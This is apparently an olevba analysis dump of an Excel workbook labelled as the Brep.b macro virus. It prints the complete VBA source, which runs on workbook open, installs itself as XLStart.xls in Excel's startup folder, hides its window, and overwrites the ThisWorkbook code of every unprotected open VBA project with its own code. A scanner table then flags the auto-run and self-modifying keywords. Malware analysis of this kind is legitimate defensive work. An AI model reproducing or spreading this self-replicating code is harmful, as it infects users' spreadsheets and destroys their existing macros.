olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Brep.b-c5ca499215e3def02226f3fe556c1f9036d3435e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Brep.b-c5ca499215e3def02226f3fe556c1f9036d3435e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Brep.b-c5ca499215e3def02226f3fe556c1f9036d3435e - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

    
    
    
    
    
    'TripperB  SIFA
Private Sub Workbook_Open()
    Dim nbc$
    Application.OnSheetActivate = ""
    If Dir(Application.StartupPath & "\" & "XLStart.xls") = "XLStart.xls" Then
        Call SIFA
        Else
        Application.ScreenUpdating = False
        ThisWorkbook.Modules.Copy
        With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
        End With
        nbc$ = ActiveWorkbook.Name
        ActiveWorkbook.Sheets(1).Protect DrawingObjects:=True, Contents:=True, Scenarios:=True
        ActiveWindow.Visible = False
        Call SIFA
        Workbooks(nbc$).SaveAs FileName:=Application.StartupPath & "/" & "XLStart.xls", FileFormat:=xlNormal _
         , Password:="", WriteResPassword:="", ReadOnlyRecommended:=False, CreateBackup:=False
        Workbooks("XLStart.xls").Saved = True
        Application.ScreenUpdating = True
    End If
End Sub
Sub SIFA()
    Dim vbp
    Dim col&
    Dim sol$
    On Error GoTo Fiu
    Application.OnSheetActivate = ""
    Application.EnableEvents = False
    col& = Application.ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines
    sol$ = Application.ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(1, col&)
    For Each vbp In Application.VBE.VBProjects
        Select Case vbp.Protection
            Case False
            col& = vbp.VBComponents("ThisWorkbook").CodeModule.CountOfLines
                If vbp.VBComponents("ThisWorkbook").CodeModule.Find("    'TripperB  SIFA", 1, 1, col&, 1) Then
                    Else
                        With vbp
                        .VBComponents("ThisWorkbook").CodeModule.DeleteLines 1, col&
                        .VBComponents("ThisWorkbook").CodeModule.AddFromString (sol$)
                        End With
                End If
            Case Else
        End Select
    Next
    Application.EnableEvents = True
    Application.OnWindow = "ThisWorkbook.SIFA"
Fiu:
End Sub



















-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

